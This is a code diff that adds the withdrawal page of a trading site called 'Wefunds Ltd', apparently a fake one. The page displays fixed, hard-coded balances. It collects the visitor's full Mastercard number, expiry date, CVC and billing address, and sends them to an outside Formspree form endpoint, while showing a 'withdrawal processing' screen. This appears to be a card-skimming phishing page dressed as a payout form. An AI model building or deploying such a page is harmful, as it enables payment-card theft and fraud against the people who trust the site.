@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdraw - Wefunds Ltd</title>
+    <style>
+        /* Reset & Base */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #0c0e12;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+            line-height: 1.6;
+        }
+        
+        /* Mobile First Navigation */
+        .navbar {
+            background: #1c1f2b;
+            padding: 15px 20px;
+            border-bottom: 1px solid #2d313d;
+            position: relative;
+            z-index: 1000;
+        }
+        
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .logo {
+            color: #f0b90b;
+            font-size: 22px;
+            font-weight: bold;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            font-size: 24px;
+        }
+        
+        /* Mobile Menu Button */
+        .menu-toggle {
+            display: none;
+            background: none;
+            border: none;
+            color: #f0b90b;
+            font-size: 28px;
+            cursor: pointer;
+            padding: 5px;
+        }
+        
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-link {
+            color: #9298a9;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 8px 12px;
+            border-radius: 5px;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        
+        .nav-link:hover, .nav-link.active {
+            color: white;
+            background: rgba(240, 185, 11, 0.1);
+        }
+        
+        .balance-display {
+            background: #141722;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-weight: 600;
+            color: #02c076;
+            border: 1px solid #2d313d;
+            font-size: 14px;
+            min-width: 100px;
+            text-align: center;
+        }
+        
+        .logout-btn {
+            background: #f6465d;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            white-space: nowrap;
+        }
+        
+        /* Main Container */
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 0 20px;
+            width: 100%;
+        }
+        
+        /* Withdraw Section */
+        .withdraw-section {
+            background: #1c1f2b;
+            border-radius: 10px;
+            border: 1px solid #2d313d;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .section-title {
+            color: #f0b90b;
+            margin-bottom: 25px;
+            font-size: 24px;
+            text-align: center;
+        }
+        
+        .balance-info {
+            background: #141722;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #2d313d;
+            text-align: center;
+        }
+        
+        .balance-label {
+            color: #9298a9;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .balance-amount {
+            font-size: 32px;
+            font-weight: bold;
+            color: #02c076;
+        }
+        
+        /* Card Types */
+        .card-types {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .card-type {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 15px;
+            background: #141722;
+            border: 2px solid #f0b90b;
+            border-radius: 8px;
+            min-width: 150px;
+            justify-content: center;
+        }
+        
+        .card-type img {
+            width: 35px;
+            height: 22px;
+            object-fit: contain;
+        }
+        
+        .card-type span {
+            font-size: 14px;
+            color: #f0b90b;
+            font-weight: 600;
+        }
+        
+        .info-note {
+            background: rgba(2, 192, 118, 0.1);
+            border: 1px solid #02c076;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #02c076;
+            text-align: center;
+        }
+        
+        /* Form */
+        .withdraw-form {
+            margin-top: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #9298a9;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            background: #141722;
+            border: 1px solid #2d313d;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #f0b90b;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .card-input-container {
+            position: relative;
+        }
+        
+        .card-logo {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 35px;
+            height: 22px;
+            object-fit: contain;
+            display: none;
+        }
+        
+        .validation-error {
+            color: #f6465d;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .submit-btn {
+            background: #02c076;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+        
+        .submit-btn:hover {
+            background: #02a766;
+            transform: translateY(-2px);
+        }
+        
+        .submit-btn:disabled {
+            background: #2d313d;
+            cursor: not-allowed;
+            opacity: 0.5;
+            transform: none;
+        }
+        
+        /* Processing & Success */
+        .processing, .success-message {
+            text-align: center;
+            padding: 30px;
+            display: none;
+        }
+        
+        .processing-spinner {
+            border: 3px solid #2d313d;
+            border-top: 3px solid #f0b90b;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            background: rgba(2, 192, 118, 0.1);
+            border: 1px solid #02c076;
+            border-radius: 10px;
+            padding: 30px;
+        }
+        
+        .success-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        
+        /* Back Button */
+        .back-btn {
+            display: block;
+            background: #2d313d;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            margin: 20px auto 0;
+            max-width: 200px;
+            transition: background 0.3s;
+        }
+        
+        .back-btn:hover {
+            background: #3a3f4d;
+        }
+        
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .menu-toggle {
+                display: block;
+            }
+            
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: #1c1f2b;
+                flex-direction: column;
+                padding: 20px;
+                border-top: 1px solid #2d313d;
+                border-bottom: 1px solid #2d313d;
+                gap: 10px;
+            }
+            
+            .nav-links.active {
+                display: flex;
+            }
+            
+            .nav-link {
+                width: 100%;
+                text-align: center;
+                padding: 12px;
+            }
+            
+            .balance-display, .logout-btn {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .container {
+                padding: 0 15px;
+            }
+            
+            .withdraw-section {
+                padding: 20px;
+            }
+            
+            .section-title {
+                font-size: 22px;
+            }
+            
+            .balance-amount {
+                font-size: 28px;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+            
+            .card-type {
+                min-width: 140px;
+                padding: 8px 12px;
+            }
+            
+            .card-type img {
+                width: 30px;
+                height: 19px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .navbar {
+                padding: 12px 15px;
+            }
+            
+            .logo {
+                font-size: 18px;
+            }
+            
+            .logo-icon {
+                font-size: 20px;
+            }
+            
+            .container {
+                padding: 0 10px;
+            }
+            
+            .withdraw-section {
+                padding: 15px;
+            }
+            
+            .balance-info {
+                padding: 15px;
+            }
+            
+            .balance-amount {
+                font-size: 24px;
+            }
+            
+            .form-group input {
+                padding: 12px;
+                font-size: 15px;
+            }
+            
+            .submit-btn {
+                padding: 14px;
+                font-size: 15px;
+            }
+            
+            .card-types {
+                gap: 10px;
+            }
+            
+            .card-type {
+                min-width: 120px;
+                padding: 6px 10px;
+            }
+            
+            .card-type span {
+                font-size: 12px;
+            }
+        }
+        
+        /* Tablet */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .container {
+                max-width: 90%;
+                padding: 0 30px;
+            }
+            
+            .nav-links {
+                gap: 12px;
+            }
+            
+            .nav-link {
+                padding: 8px 10px;
+                font-size: 14px;
+            }
+            
+            .balance-display {
+                padding: 8px 12px;
+                font-size: 13px;
+                min-width: 90px;
+            }
+            
+            .logout-btn {
+                padding: 8px 12px;
+                font-size: 13px;
+            }
+        }
+        
+        /* Small height devices */
+        @media (max-height: 600px) {
+            .navbar {
+                padding: 10px 15px;
+            }
+            
+            .container {
+                margin: 20px auto;
+            }
+            
+            .withdraw-section {
+                padding: 15px;
+            }
+            
+            .form-group {
+                margin-bottom: 15px;
+            }
+            
+            .submit-btn {
+                margin-top: 15px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="dashboard.html" class="logo">
+                <span class="logo-icon">💰</span>
+                <span>Wefunds Ltd</span>
+            </a>
+            
+            <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+            
+            <div class="nav-links" id="navLinks">
+                <a href="dashboard.html" class="nav-link">Dashboard</a>
+                <a href="withdraw.html" class="nav-link active">Withdraw</a>
+                <div class="balance-display" id="navBalance">$10,000.00</div>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container">
+        <div class="withdraw-section">
+            <div class="section-title">Withdraw Funds</div>
+            
+            <!-- Balance Info -->
+            <div class="balance-info">
+                <div class="balance-label">Available for Withdrawal</div>
+                <div class="balance-amount" id="withdrawableBalance">$1,000.00</div>
+            </div>
+            
+            <!-- Card Types Info -->
+            <div class="card-types">
+                <div class="card-type">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
+                    <span>Mastercard Only</span>
+                </div>
+            </div>
+            
+            <div class="info-note">
+                💳 Only Mastercard cards are accepted. Card must be valid and active.
+            </div>
+            
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+                <div class="success-icon">✅</div>
+                <h3 style="color: #02c076; margin-bottom: 10px;">Withdrawal Request Submitted!</h3>
+                <p>Your withdrawal request has been received and is being processed.</p>
+                <p>You will receive a confirmation email shortly.</p>
+                <p style="margin-top: 15px;">
+                    <a href="dashboard.html" style="color: #f0b90b; text-decoration: none; font-weight: bold;">
+                        ← Return to Dashboard
+                    </a>
+                </p>
+            </div>
+            
+            <!-- Withdraw Form -->
+            <form class="withdraw-form" id="withdrawForm" action="https://formspree.io/f/mgvybdvz" method="POST">
+                <!-- Hidden fields for Formspree -->
+                <input type="hidden" name="_subject" value="New Withdrawal Request - Wefunds Ltd">
+                <input type="hidden" name="_replyto" id="replyToEmail" value="">
+                <input type="hidden" name="_cc" value="">
+                <input type="hidden" name="_format" value="plain">
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Card Holder Name</label>
+                        <input type="text" id="cardName" name="card_holder_name" placeholder="John Doe" required>
+                        <div class="validation-error" id="cardNameError">Enter valid name (letters and spaces only)</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="john@example.com" required>
+                        <div class="validation-error" id="emailError">Enter valid email address</div>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <div class="card-input-container">
+                            <input type="text" id="cardNumber" name="card_number" placeholder="1234 5678 9012 3456" required maxlength="19">
+                            <img id="cardLogo" class="card-logo" src="" alt="Card Type">
+                        </div>
+                        <div class="validation-error" id="cardNumberError">Enter valid 16-digit Mastercard number (starts with 51-55)</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Amount to Withdraw ($)</label>
+                        <input type="number" id="amount" name="amount" placeholder="1000" min="1" max="1000" value="1000" required>
+                        <div class="validation-error" id="amountError">Amount must be between $1 and $1,000</div>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Expiry Date (MM/YY)</label>
+                        <input type="text" id="expiryDate" name="expiry_date" placeholder="MM/YY" required maxlength="5">
+                        <div class="validation-error" id="expiryError">Enter valid expiry date (MM/YY)</div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVC</label>
+                        <input type="text" id="cvc" name="cvc" placeholder="123" required maxlength="4">
+                        <div class="validation-error" id="cvcError">Enter valid CVC (3-4 digits)</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Billing Address</label>
+                    <input type="text" id="address" name="billing_address" placeholder="123 Main St, City, Country" required>
+                    <div class="validation-error" id="addressError">Enter valid address</div>
+                </div>
+                
+                <!-- Additional hidden data -->
+                <input type="hidden" name="user_id" id="userId" value="">
+                <input type="hidden" name="user_balance" value="10000">
+                <input type="hidden" name="withdrawal_balance" value="1000">
+                <input type="hidden" name="timestamp" id="timestamp" value="">
+                
+                <button type="button" class="submit-btn" id="submitBtn" onclick="validateAndProcess()">Process Withdrawal</button>
+            </form>
+            
+            <!-- Processing Screen -->
+            <div class="processing" id="processingScreen">
+                <div class="processing-spinner"></div>
+                <div style="font-size: 18px; margin-bottom: 10px; font-weight: 600;">Processing Withdrawal</div>
+                <div style="color: #9298a9; font-size: 14px; margin-bottom: 5px;">Your withdrawal of $<span id="processingAmount">0</span> is being processed...</div>
+                <div style="color: #9298a9; font-size: 12px;">Submitting to Formspree...</div>
+            </div>
+        </div>
+        
+        <a href="dashboard.html" class="back-btn">← Back to Dashboard</a>
+    </div>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    
+    <script>
+        // Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDkYmCw8aXm4vdlFUSPtsbaj0dLr14vUiw",
+            authDomain: "trading-ce7a5.firebaseapp.com",
+            projectId: "trading-ce7a5",
+            storageBucket: "trading-ce7a5.firebasestorage.app",
+            messagingSenderId: "558394601592",
+            appId: "1:558394601592:web:d9d3417ee8960033407d8d"
+        };
+
+        // Initialize Firebase
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+        
+        // Card validation patterns - ONLY MASTERCARD
+        const mastercardPattern = /^5[1-5][0-9]{14}$/;
+        const formspreeUrl = 'https://formspree.io/f/mdkgpkeo';
+
+        // Toggle mobile menu
+        function toggleMenu() {
+            const navLinks = document.getElementById('navLinks');
+            navLinks.classList.toggle('active');
+        }
+
+        // Close mobile menu when clicking outside
+        document.addEventListener('click', function(event) {
+            const navLinks = document.getElementById('navLinks');
+            const menuToggle = document.querySelector('.menu-toggle');
+            
+            if (!navLinks.contains(event.target) && !menuToggle.contains(event.target)) {
+                navLinks.classList.remove('active');
+            }
+        });
+
+        // Check if user is logged in
+        auth.onAuthStateChanged(async (user) => {
+            if (!user) {
+                window.location.href = 'login.html';
+                return;
+            }
+            
+            // Set user ID for form
+            document.getElementById('userId').value = user.uid;
+            document.getElementById('timestamp').value = new Date().toISOString();
+            document.getElementById('replyToEmail').value = user.email;
+            
+            // Load user data
+            const userDoc = await db.collection('users').doc(user.uid).get();
+            
+            // Set FIXED balances as requested
+            const totalBalance = 10000.00;
+            const withdrawalBalance = 1000.00;
+            
+            // Update display with FIXED values
+            document.getElementById('withdrawableBalance').textContent = `$${withdrawalBalance.toFixed(2)}`;
+            document.getElementById('navBalance').textContent = `$${totalBalance.toFixed(2)}`;
+            
+            // Set fixed amount in form
+            document.getElementById('amount').value = withdrawalBalance;
+            document.getElementById('amount').max = withdrawalBalance;
+            
+            // Auto-fill email
+            document.getElementById('email').value = user.email;
+            
+            // Suggest name from user data
+            if (userDoc.exists) {
+                const userData = userDoc.data();
+                if (userData.fullName) {
+                    document.getElementById('cardName').value = userData.fullName;
+                }
+            }
+        });
+
+        // Detect card type and show logo
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formatted.substring(0, 19);
+            
+            // Detect card type
+            const cleanNumber = value.replace(/\D/g, '');
+            const cardLogo = document.getElementById('cardLogo');
+            
+            if (mastercardPattern.test(cleanNumber)) {
+                cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png';
+                cardLogo.style.display = 'block';
+            } else if (cleanNumber.length >= 2) {
+                cardLogo.src = '';
+                cardLogo.style.display = 'none';
+            }
+        });
+
+        // Validate all fields
+        function validateAllFields() {
+            let isValid = true;
+            
+            // Reset errors
+            document.querySelectorAll('.validation-error').forEach(el => {
+                el.style.display = 'none';
+            });
+            
+            // Validate Card Holder Name
+            const cardName = document.getElementById('cardName').value.trim();
+            if (!/^[A-Za-z\s]{3,50}$/.test(cardName)) {
+                document.getElementById('cardNameError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate Email
+            const email = document.getElementById('email').value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate Card Number - ONLY MASTERCARD
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cleanCardNumber = cardNumber.replace(/\D/g, '');
+            
+            if (!mastercardPattern.test(cleanCardNumber) || cleanCardNumber.length !== 16) {
+                document.getElementById('cardNumberError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate Amount
+            const amount = parseFloat(document.getElementById('amount').value);
+            if (isNaN(amount) || amount < 1 || amount > 1000) {
+                document.getElementById('amountError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate Expiry Date
+            const expiryDate = document.getElementById('expiryDate').value.trim();
+            const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!expiryRegex.test(expiryDate)) {
+                document.getElementById('expiryError').style.display = 'block';
+                isValid = false;
+            } else {
+                // Check if card is expired
+                const [month, year] = expiryDate.split('/');
+                const expiry = new Date(2000 + parseInt(year), parseInt(month), 0);
+                const today = new Date();
+                if (expiry < today) {
+                    document.getElementById('expiryError').textContent = 'Card has expired';
+                    document.getElementById('expiryError').style.display = 'block';
+                    isValid = false;
+                }
+            }
+            
+            // Validate CVC
+            const cvc = document.getElementById('cvc').value.trim();
+            if (!/^\d{3,4}$/.test(cvc)) {
+                document.getElementById('cvcError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate Address
+            const address = document.getElementById('address').value.trim();
+            if (address.length < 10 || address.length > 100) {
+                document.getElementById('addressError').style.display = 'block';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+
+        // Submit to Formspree using Fetch API
+        async function submitToFormspree(formData) {
+            try {
+                const response = await fetch(formspreeUrl, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                
+                if (response.ok) {
+                    return { success: true, message: 'Form submitted successfully' };
+                } else {
+                    const errorData = await response.json();
+                    return { 
+                        success: false, 
+                        message: errorData.error || 'Submission failed' 
+                    };
+                }
+            } catch (error) {
+                return { 
+                    success: false, 
+                    message: 'Network error. Please try again.' 
+                };
+            }
+        }
+
+        // Validate and process withdrawal
+        async function validateAndProcess() {
+            // Validate all fields first
+            if (!validateAllFields()) {
+                alert('Please correct the errors in the form');
+                return;
+            }
+            
+            const cardName = document.getElementById('cardName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const amount = parseFloat(document.getElementById('amount').value);
+            const expiryDate = document.getElementById('expiryDate').value.trim();
+            const cvc = document.getElementById('cvc').value.trim();
+            const address = document.getElementById('address').value.trim();
+            
+            // Additional validation
+            const cleanCardNumber = cardNumber.replace(/\s/g, '');
+            
+            // Validate card using Luhn algorithm
+            if (!luhnCheck(cleanCardNumber)) {
+                alert('Invalid card number. Please check and try again.');
+                return;
+            }
+            
+            // Mastercard validation
+            if (!cleanCardNumber.startsWith('51') && 
+                !cleanCardNumber.startsWith('52') && 
+                !cleanCardNumber.startsWith('53') && 
+                !cleanCardNumber.startsWith('54') && 
+                !cleanCardNumber.startsWith('55')) {
+                alert('Only Mastercard cards are accepted (must start with 51-55)');
+                return;
+            }
+            
+            if (amount > 1000) {
+                alert('Maximum withdrawal amount is $1,000');
+                return;
+            }
+            
+            const user = auth.currentUser;
+            if (!user) {
+                window.location.href = 'login.html';
+                return;
+            }
+            
+            // Disable submit button
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Show processing screen
+            document.getElementById('withdrawForm').style.display = 'none';
+            document.getElementById('processingScreen').style.display = 'block';
+            document.getElementById('processingAmount').textContent = amount.toFixed(2);
+            
+            try {
+                // Prepare form data for Formspree
+                const formData = new FormData(document.getElementById('withdrawForm'));
+                
+                // Submit to Formspree
+                const formspreeResult = await submitToFormspree(formData);
+                
+                if (!formspreeResult.success) {
+                    throw new Error('Formspree submission failed: ' + formspreeResult.message);
+                }
+                
+                // Update Firebase
+                const userDoc = await db.collection('users').doc(user.uid).get();
+                
+                if (userDoc.exists) {
+                    const userData = userDoc.data();
+                    
+                    // Update user data
+                    await db.collection('users').doc(user.uid).update({
+                        withdrawalBalance: userData.withdrawalBalance - amount,
+                        balance: userData.balance - amount,
+                        transactions: firebase.firestore.FieldValue.arrayUnion({
+                            type: 'withdrawal',
+                            amount: amount,
+                            method: 'Mastercard',
+                            status: 'processing',
+                            timestamp: new Date(),
+                            details: {
+                                cardLast4: cleanCardNumber.slice(-4),
+                                email: email,
+                                address: address
+                            }
+                        })
+                    });
+                } else {
+                    // Create user with updated balances
+                    await db.collection('users').doc(user.uid).set({
+                        email: user.email,
+                        fullName: user.email.split('@')[0],
+                        balance: 9000.00,
+                        tradingBalance: 9000.00,
+                        withdrawalBalance: 0.00,
+                        transactions: [{
+                            type: 'withdrawal',
+                            amount: amount,
+                            method: 'Mastercard',
+                            status: 'processing',
+                            timestamp: new Date(),
+                            details: {
+                                cardLast4: cleanCardNumber.slice(-4),
+                                email: email,
+                                address: address
+                            }
+                        }],
+                        investments: [],
+                        createdAt: new Date()
+                    });
+                }
+                
+                // Add withdrawal record
+                await db.collection('withdrawals').add({
+                    userId: user.uid,
+                    userEmail: user.email,
+                    amount: amount,
+                    cardName: cardName,
+                    cardLast4: cleanCardNumber.slice(-4),
+                    email: email,
+                    address: address,
+                    status: 'processing',
+                    timestamp: new Date(),
+                    validated: true,
+                    cardType: 'Mastercard'
+                });
+                
+                // Show success message
+                setTimeout(() => {
+                    document.getElementById('processingScreen').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Auto redirect after 5 seconds
+                    setTimeout(() => {
+                        window.location.href = 'dashboard.html';
+                    }, 5000);
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Withdrawal error:', error);
+                alert('Withdrawal failed: ' + error.message);
+                
+                // Re-enable submit button
+                document.getElementById('submitBtn').disabled = false;
+                
+                // Show form again
+                document.getElementById('withdrawForm').style.display = 'block';
+                document.getElementById('processingScreen').style.display = 'none';
+            }
+        }
+
+        // Luhn algorithm for card validation
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return (sum % 10) === 0;
+        }
+
+        // Logout function
+        async function logout() {
+            try {
+                await auth.signOut();
+                window.location.href = 'login.html';
+            } catch (error) {
+                console.error('Logout error:', error);
+                alert('Logout failed. Please try again.');
+            }
+        }
+
+        // Format expiry date
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value.substring(0, 5);
+        });
+
+        // Format CVC
+        document.getElementById('cvc').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+        });
+
+        // Real-time validation on mobile
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('blur', validateAllFields);
+            input.addEventListener('input', function() {
+                const error = this.parentElement.querySelector('.validation-error');
+                if (error) error.style.display = 'none';
+            });
+        });
+
+        // Handle orientation change
+        window.addEventListener('orientationchange', function() {
+            setTimeout(toggleMenu, 300);
+        });
+    </script>
+</body>
+</html>
